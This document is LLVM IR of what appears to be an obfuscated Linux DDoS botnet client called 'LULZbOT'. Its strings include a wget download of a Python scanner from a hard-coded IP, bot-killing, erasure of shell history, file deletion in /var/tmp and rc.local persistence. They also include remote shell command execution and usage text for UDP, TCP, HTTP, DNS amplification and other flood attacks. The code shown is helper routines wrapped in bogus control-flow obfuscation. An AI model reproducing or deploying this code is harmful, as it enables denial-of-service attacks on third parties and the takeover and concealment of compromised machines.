@.str.403 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.404 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.405 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.406 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.407 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.408 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.409 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.410 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.411 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.412 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.415, i32 0, i32 0)], align 16
@.str.416 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\0D\0A\00", align 1
@.str.413 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.414 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.415 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.417 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.418 = private unnamed_addr constant [10 x i8] c"./DNS.txt\00", align 1
@.str.419 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.420 = private unnamed_addr constant [12 x i8] c"irctc.co.in\00", align 1
@.str.421 = private unnamed_addr constant [10 x i8] c"pkill -9 \00", align 1
@.str.422 = private unnamed_addr constant [20 x i8] c"||busybox pkill -9 \00", align 1
@.str.423 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.424 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@.str.425 = private unnamed_addr constant [21 x i8] c"cd /var/tmp; rm -f *\00", align 1
@.str.426 = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@.str.427 = private unnamed_addr constant [8 x i8] c"http://\00", align 1
@.str.428 = private unnamed_addr constant [132 x i8] c"GET /%s HTTP/1.1\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: */*\0D\0AConnection: Keep-Alive\0D\0A\0D\0A\00", align 1
@.str.429 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.430 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"PYTHON\00", align 1
@.str.432 = private unnamed_addr constant [8 x i8] c"INSTALL\00", align 1
@.str.433 = private unnamed_addr constant [139 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget http://199.38.245.222/good2.py\00", align 1
@.str.434 = private unnamed_addr constant [26 x i8] c"INSTALLING PYTHON SCANNER\00", align 1
@.str.435 = private unnamed_addr constant [5 x i8] c"bins\00", align 1
@.str.436 = private unnamed_addr constant [56 x i8] c"cd /.tmp;rm -rf *py;wget http://199.38.245.222/good2.py\00", align 1
@.str.437 = private unnamed_addr constant [24 x i8] c"UPDATING PYTHON SCANNER\00", align 1
@.str.438 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.439 = private unnamed_addr constant [31 x i8] c"killall -9 python;pkill python\00", align 1
@.str.440 = private unnamed_addr constant [24 x i8] c"STOPPING PYTHON SCANNER\00", align 1
@.str.441 = private unnamed_addr constant [6 x i8] c"START\00", align 1
@.str.442 = private unnamed_addr constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00", align 1
@.str.443 = private unnamed_addr constant [25 x i8] c"STARTING LE HACKA SCANNA\00", align 1
@.str.444 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.445 = private unnamed_addr constant [6 x i8] c"TABLE\00", align 1
@.str.446 = private unnamed_addr constant [23 x i8] c"bins TAKEN SUCCESFULLY\00", align 1
@.str.447 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.448 = private unnamed_addr constant [17 x i8] c"STOPPING SCANNER\00", align 1
@.str.449 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.450 = private unnamed_addr constant [26 x i8] c"STARTING SCANNER ON -> %s\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"BOTKILL\00", align 1
@.str.452 = private unnamed_addr constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00", align 1
@.str.453 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.454 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.455 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.456 = private unnamed_addr constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00", align 1
@.str.457 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.458 = private unnamed_addr constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00", align 1
@.str.459 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.460 = private unnamed_addr constant [50 x i8] c"HTTP <method> <host> <port> <path> <time> <power>\00", align 1
@.str.461 = private unnamed_addr constant [4 x i8] c"DNS\00", align 1
@.str.462 = private unnamed_addr constant [91 x i8] c"DNS <target IP> <port> <reflection file url> <forks> <pps limiter, -1 for no limit> <time>\00", align 1
@.str.463 = private unnamed_addr constant [58 x i8] c"DNS amplification flooding %s:%s for %d seconds at %d pps\00", align 1
@.str.464 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.465 = private unnamed_addr constant [28 x i8] c"HOLD <target> <port> <time>\00", align 1
@.str.466 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.467 = private unnamed_addr constant [24 x i8] c"JUNK <ip> <port> <time>\00", align 1
@.str.468 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.469 = private unnamed_addr constant [27 x i8] c"STD <target> <port> <time>\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.471 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.472 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.473 = private unnamed_addr constant [22 x i8] c"KILLMYEYEPEEUSINGHOIC\00", align 1
@.str.474 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.475 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.476 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.477 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.478 = private unnamed_addr constant [9 x i8] c"LULZbOT\0A\00", align 1
@.str.479 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.480 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.481 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.482 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.483 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.484 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.485 = private unnamed_addr constant [12 x i8] c"BUILD %s:%s\00", align 1
@.str.486 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.487 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.488 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.489 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.490 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.491 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0
@x.99 = common global i32 0
@y.100 = common global i32 0
@x.101 = common global i32 0
@y.102 = common global i32 0
@x.103 = common global i32 0
@y.104 = common global i32 0
@x.105 = common global i32 0
@y.106 = common global i32 0
@x.107 = common global i32 0
@y.108 = common global i32 0
@x.109 = common global i32 0
@y.110 = common global i32 0
@x.111 = common global i32 0
@y.112 = common global i32 0
@x.113 = common global i32 0
@y.114 = common global i32 0
@x.115 = common global i32 0
@y.116 = common global i32 0
@x.117 = common global i32 0
@y.118 = common global i32 0
@x.119 = common global i32 0
@y.120 = common global i32 0
@x.121 = common global i32 0
@y.122 = common global i32 0
@x.123 = common global i32 0
@y.124 = common global i32 0
@x.125 = common global i32 0
@y.126 = common global i32 0
@x.127 = common global i32 0
@y.128 = common global i32 0
@x.129 = common global i32 0
@y.130 = common global i32 0
@x.131 = common global i32 0
@y.132 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = load i32, i32* @x
  %3 = load i32, i32* @y
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* %10, align 4
  store i32 %12, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %13 = load i32, i32* %10, align 4
  %14 = add i32 %13, -1640531527
  store i32 %14, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %15 = load i32, i32* %10, align 4
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %11, align 4
  %18 = load i32, i32* @x
  %19 = load i32, i32* @y
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %47, %originalBBpart2
  %27 = load i32, i32* %11, align 4
  %28 = icmp slt i32 %27, 4096
  br i1 %28, label %29, label %50

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* %11, align 4
  %31 = sub nsw i32 %30, 3
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %32
  %34 = load i32, i32* %33, align 4
  %35 = load i32, i32* %11, align 4
  %36 = sub nsw i32 %35, 2
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %34, %39
  %41 = xor i32 %40, -1640531527
  %42 = load i32, i32* %11, align 4
  %43 = xor i32 %41, %42
  %44 = load i32, i32* %11, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  store i32 %43, i32* %46, align 4
  br label %47

; <label>:47:                                     ; preds = %29
  %48 = load i32, i32* %11, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %11, align 4
  br label %26

; <label>:50:                                     ; preds = %26
  %51 = load i32, i32* @x
  %52 = load i32, i32* @y
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %50
  %59 = load i32, i32* @x
  %60 = load i32, i32* @y
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %67 = alloca i32, align 4
  %68 = alloca i32, align 4
  store i32 %0, i32* %67, align 4
  %69 = load i32, i32* %67, align 4
  store i32 %69, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %70 = load i32, i32* %67, align 4
  %_ = sub i32 0, %70
  %gen = add i32 %_, -1640531527
  %_1 = sub i32 %70, -1640531527
  %gen2 = mul i32 %_1, -1640531527
  %_3 = sub i32 %70, -1640531527
  %gen4 = mul i32 %_3, -1640531527
  %_5 = sub i32 %70, -1640531527
  %gen6 = mul i32 %_5, -1640531527
  %71 = add i32 %70, -1640531527
  store i32 %71, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %72 = load i32, i32* %67, align 4
  %_7 = sub i32 %72, -1640531527
  %gen8 = mul i32 %_7, -1640531527
  %_9 = sub i32 0, %72
  %gen10 = add i32 %_9, -1640531527
  %_11 = sub i32 0, %72
  %gen12 = add i32 %_11, -1640531527
  %_13 = sub i32 %72, -1640531527
  %gen14 = mul i32 %_13, -1640531527
  %_15 = sub i32 %72, -1640531527
  %gen16 = mul i32 %_15, -1640531527
  %_17 = shl i32 %72, -1640531527
  %_18 = sub i32 %72, -1640531527
  %gen19 = mul i32 %_18, -1640531527
  %_20 = sub i32 %72, -1640531527
  %gen21 = mul i32 %_20, -1640531527
  %73 = add i32 %72, -1640531527
  %_22 = sub i32 0, %73
  %gen23 = add i32 %_22, -1640531527
  %_24 = sub i32 0, %73
  %gen25 = add i32 %_24, -1640531527
  %74 = add i32 %73, -1640531527
  store i32 %74, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %68, align 4
  br label %originalBB

originalBB26alteredBB:                            ; preds = %originalBB26, %50
  br label %originalBB26
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %21, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %5, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i64
  %17 = inttoptr i64 %16 to i8*
  %18 = call i32 @strcmp(i8* %17, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #10
  %19 = icmp ne i32 %18, 0
  %20 = xor i1 %19, true
  br i1 %20, label %21, label %24

; <label>:21:                                     ; preds = %10
  %22 = load i32, i32* %4, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %4, align 4
  br label %10

; <label>:24:                                     ; preds = %10
  %25 = load i32, i32* @x.3
  %26 = load i32, i32* @y.4
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i32, i32* @x.3
  %34 = load i32, i32* @y.4
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %41

; <label>:41:                                     ; preds = %58, %originalBBpart2
  %42 = load i32, i32* %5, align 4
  %43 = load i32, i32* %4, align 4
  %44 = icmp sge i32 %42, %43
  br i1 %44, label %45, label %56

; <label>:45:                                     ; preds = %41
  %46 = load i8*, i8** %2, align 8
  %47 = load i32, i32* %5, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i8, i8* %46, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = sext i8 %50 to i64
  %52 = inttoptr i64 %51 to i8*
  %53 = call i32 @strcmp(i8* %52, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #10
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  br label %56

; <label>:56:                                     ; preds = %45, %41
  %57 = phi i1 [ false, %41 ], [ %55, %45 ]
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %56
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, -1
  store i32 %60, i32* %5, align 4
  br label %41

; <label>:61:                                     ; preds = %56
  %62 = load i32, i32* %4, align 4
  store i32 %62, i32* %3, align 4
  br label %63

; <label>:63:                                     ; preds = %95, %61
  %64 = load i32, i32* @x.3
  %65 = load i32, i32* @y.4
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %63
  %72 = load i32, i32* %3, align 4
  %73 = load i32, i32* %5, align 4
  %74 = icmp sle i32 %72, %73
  %75 = load i32, i32* @x.3
  %76 = load i32, i32* @y.4
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %74, label %83, label %98

; <label>:83:                                     ; preds = %originalBBpart24
  %84 = load i8*, i8** %2, align 8
  %85 = load i32, i32* %3, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  %88 = load i8, i8* %87, align 1
  %89 = load i8*, i8** %2, align 8
  %90 = load i32, i32* %3, align 4
  %91 = load i32, i32* %4, align 4
  %92 = sub nsw i32 %90, %91
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %89, i64 %93
  store i8 %88, i8* %94, align 1
  br label %95

; <label>:95:                                     ; preds = %83
  %96 = load i32, i32* %3, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %3, align 4
  br label %63

; <label>:98:                                     ; preds = %originalBBpart24
  %99 = load i8*, i8** %2, align 8
  %100 = load i32, i32* %3, align 4
  %101 = load i32, i32* %4, align 4
  %102 = sub nsw i32 %100, %101
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %99, i64 %103
  store i8 0, i8* %104, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %24
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %63
  %105 = load i32, i32* %3, align 4
  %106 = load i32, i32* %5, align 4
  %107 = icmp sle i32 %105, %106
  br label %originalBB1
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = load i32, i32* @x.7
  %5 = load i32, i32* @y.8
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca %struct.__va_list_tag*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [2 x i8], align 1
  %19 = alloca i8*, align 8
  store i8** %0, i8*** %12, align 8
  store i8* %1, i8** %13, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %14, align 8
  store i32 0, i32* %17, align 4
  %20 = load i32, i32* @x.7
  %21 = load i32, i32* @y.8
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %originalBBpart2112, %originalBBpart2
  %29 = load i8*, i8** %13, align 8
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %542

; <label>:33:                                     ; preds = %28
  %34 = load i8*, i8** %13, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  br i1 %37, label %38, label %498

; <label>:38:                                     ; preds = %33
  %39 = load i8*, i8** %13, align 8
  %40 = getelementptr inbounds i8, i8* %39, i32 1
  store i8* %40, i8** %13, align 8
  store i32 0, i32* %16, align 4
  store i32 0, i32* %15, align 4
  %41 = load i8*, i8** %13, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %62

; <label>:45:                                     ; preds = %38
  %46 = load i32, i32* @x.7
  %47 = load i32, i32* @y.8
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i32, i32* @x.7
  %55 = load i32, i32* @y.8
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %542

; <label>:62:                                     ; preds = %38
  %63 = load i32, i32* @x.7
  %64 = load i32, i32* @y.8
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  %71 = load i8*, i8** %13, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 37
  %75 = load i32, i32* @x.7
  %76 = load i32, i32* @y.8
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %74, label %83, label %84

; <label>:83:                                     ; preds = %originalBBpart28
  br label %499

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load i8*, i8** %13, align 8
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 45
  br i1 %88, label %89, label %92

; <label>:89:                                     ; preds = %84
  %90 = load i8*, i8** %13, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
